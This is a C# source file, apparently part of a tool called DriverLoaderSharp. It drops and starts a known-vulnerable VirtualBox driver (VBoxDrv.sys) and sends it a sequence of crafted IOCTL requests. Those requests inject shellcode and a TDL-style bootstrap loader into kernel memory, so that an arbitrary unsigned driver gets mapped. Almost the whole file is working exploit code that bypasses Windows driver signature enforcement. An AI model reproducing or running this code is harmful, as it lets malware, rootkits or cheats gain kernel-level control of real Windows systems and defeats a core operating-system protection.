using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace DriverLoaderSharp
{
    public unsafe class VirtualBox
    {
        public static String DriverDisplayName = "VBoxDrv";
        public static String DriverFileName = @"C:\Windows\System32\drivers\VBoxDrv.sys";
        public static String DriverDeviceName = @"\\.\VBoxDrv";
        public static IntPtr ServiceHandle;
        public static IntPtr DeviceHandle;
        public static void Load()
        {
            ServiceManager.Load(DriverDisplayName, DriverFileName, DriverDeviceName, out DeviceHandle, out ServiceHandle, Properties.Resources.vboxdrv_exploitable);
        }
        public static void Unload()
        {
            ServiceManager.StopService(DriverDisplayName, DeviceHandle.ToInt32(), true);
            File.Delete(DriverFileName);
        }
        public static void MapDriver(String driverPath)
        {
            Unload();
            Load();
            try
            {
                var imageBase = Natives.LoadLibrary(driverPath);
                var ExAllocatePoolWithTag = Natives.FindKernelProcedure("ExAllocatePoolWithTag");
                var shellcode = new List<Byte>();
                shellcode.Add(0x48); // mov rcx, ExAllocatePoolWithTag
                shellcode.Add(0xb9);
                shellcode.AddRange(BitConverter.GetBytes(ExAllocatePoolWithTag));
                shellcode.AddRange(Shellcode.TDLBootstrapLoader_code_w10rs2);
                var image = new Byte[0x7000]; // todo, pull from memory
                Marshal.Copy(imageBase, image, 0, image.Length);
                image = ImportResolver.ResolveKernelImports(image);
                while (shellcode.Count() != 0x30a)
                    shellcode.Add(0);
                shellcode.AddRange(image);
                Exploit(shellcode.ToArray(), 0x8000, 0x30a);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            finally
            {
                Unload();
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct Header
        {
            public UInt32 Cookie;
            public UInt32 SessionCookie;
            public Int32 InputSize;
            public Int32 OutputSize;
            public UInt32 Flags;
            public UInt32 Status;
            public Header(UInt32 cookie, UInt32 sessionCookie, Int32 inputSize, Int32 outputSize)
            {
                Cookie = cookie;
                SessionCookie = sessionCookie;
                InputSize = inputSize;
                OutputSize = outputSize;
                Flags = DefaultFlags;
                Status = 0;
            }
            public static Header CreateHeader<T, V>(ConnectOut cookie)
            {
                var h = new Header();
                h.Cookie = cookie.Cookie;
                h.SessionCookie = cookie.SessionCookie;
                h.InputSize = Marshal.SizeOf<T>();
                h.OutputSize = Marshal.SizeOf<V>();
                h.Flags = DefaultFlags;
                h.Status = 0;
                return h;
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ConnectIn
        {
            public Header Header;
            public fixed Byte MagicWord[16];
            public UInt32 RequestedVersion;
            public UInt32 InterfaceVersion;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ConnectOut
        {
            public Header Header;
            public UInt32 Cookie;
            public UInt32 SessionCookie;
            public UInt32 SessionVersion;
            public UInt32 DriverVersion;
            public UInt32 NumFunctions;
            public UIntPtr SessionHandler;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LdrOpIn
        {
            public Header Header;
            public Int32 CodeSize;
            public fixed Byte NameTag[33];
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LdrOpOut
        {
            public Header Header;
            public UInt64 ImageBase;
            public UInt32 NeedsLoading;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LdrLdIn
        {
            public Header Header;
            public UInt64 ModuleInit;
            public UInt64 ModuleTerm;
            public UInt64 ModuleHandler;
            public UInt64 ModuleHandlerEntryInt;
            public UInt64 ModuleHandlerEntryFast;
            public UInt64 ModuleHandlerEntryEx;
            public UInt64 ImageBase;
            public UInt32 EntryPointType;
            public UInt32 SymbolTableOffset;
            public UInt32 NumSymbols;
            public UInt32 StringTableOffset;
            public UInt32 NumStrings;
            public Int32 ImageSize;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LdrLdInWithPayload
        {
            public LdrLdIn LdrLd;
            public fixed Byte Payload[0x8000];
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SetVMForFastIn
        {
            public Header Header;
            public UInt64 Ring0VMPtr;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LdrFreeIn
        {
            public Header Header;
            public UInt64 ImageBase;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct NopIn
        {
        }
        public static Int32 IOCTL(Int32 Function) { return Natives.CTL_CODE(Natives.FILE_DEVICE_UNKNOWN, (Function) | 0x80, Natives.CtlMethod.Buffered, 2); }
        public static Int32 Connect = IOCTL(1);
        public static Int32 LoaderOpen = IOCTL(5);
        public static Int32 LoaderLoad = IOCTL(6);
        public static Int32 LoaderFree = IOCTL(7);
        public static Int32 SetVMForFast = IOCTL(19);
        public static Int32 FastDoNop = Natives.CTL_CODE(Natives.FILE_DEVICE_UNKNOWN, (66) | 0x80, Natives.CtlMethod.Neither, 2);
        public static UInt32 DefaultFlags = 0x42000042;
        public static void Exploit(Byte[] shellcode, Int32 codeSize, Int32 dataOffset)
        {
            var connect = new ConnectIn { Header = new Header(BitConverter.ToUInt32(Encoding.Default.GetBytes("tori"), 0), 0, Marshal.SizeOf<ConnectIn>(), Marshal.SizeOf<ConnectOut>()) };
            connect.RequestedVersion = 0;
            connect.InterfaceVersion = 0x00070002;
            Marshal.Copy(Encoding.Default.GetBytes("The Magic Word!").ToArray(), 0, new IntPtr(connect.MagicWord), 15);
            var cookie = Natives.DeviceIoControl<ConnectOut>(DeviceHandle, Connect, connect);
            if (cookie.Cookie == 0)
                throw new Exception("Connect to VBox Failed");

            var ldrOp = new LdrOpIn { Header = Header.CreateHeader<LdrOpIn, LdrOpOut>(cookie), CodeSize = codeSize};
            Marshal.Copy(Encoding.Default.GetBytes("shalzuth").ToArray(), 0, new IntPtr(ldrOp.NameTag), 8);
            var ldrOpOut = Natives.DeviceIoControl<LdrOpOut>(DeviceHandle, LoaderOpen, ldrOp);
            if (ldrOpOut.Header.Cookie == 0)
                throw new Exception("Loader Open Failed");

            Console.WriteLine("ldrOpOut.ImageBase : " + ldrOpOut.ImageBase.ToString("X"));
            var imageBase = ldrOpOut.ImageBase;

            var ldrLd = new LdrLdIn { Header = Header.CreateHeader<LdrLdInWithPayload, Header>(cookie) };
            ldrLd.EntryPointType = 1; //SUPLDRLOADEP_VMMR0
            ldrLd.ImageBase = ldrLd.ModuleHandlerEntryEx = ldrLd.ModuleHandlerEntryFast = ldrLd.ModuleHandlerEntryInt = imageBase;
            ldrLd.ModuleHandler = 0x1a000;
            ldrLd.ImageSize = codeSize;
            var ldrLdWithPayload = new LdrLdInWithPayload { LdrLd = ldrLd };
            Marshal.Copy(shellcode, 0, new IntPtr(ldrLdWithPayload.Payload), shellcode.Length);
            if (Natives.DeviceIoControl<Header>(DeviceHandle, LoaderLoad, ldrLdWithPayload).Cookie == 0)
                throw new Exception("Loader Load Failed");

            var setVmForFast = new SetVMForFastIn { Header = Header.CreateHeader<SetVMForFastIn, Header>(cookie), Ring0VMPtr = 0x1a000 };
            if (Natives.DeviceIoControl<Header>(DeviceHandle, SetVMForFast, setVmForFast).Cookie == 0)
                throw new Exception("Set VM Failed");

            if (Natives.DeviceIoControl<UInt64>(DeviceHandle, FastDoNop, new NopIn()) != 0)
                throw new Exception("Fast NOP Failed");

            Console.WriteLine("sys injected, freeing");

            var ldrFree = new LdrFreeIn { Header = Header.CreateHeader<LdrFreeIn, Header>(cookie), ImageBase = imageBase };
            if (Natives.DeviceIoControl<Header>(DeviceHandle, LoaderFree, ldrFree).Cookie == 0)
                throw new Exception("Load Free Failed");
        }
    }
}
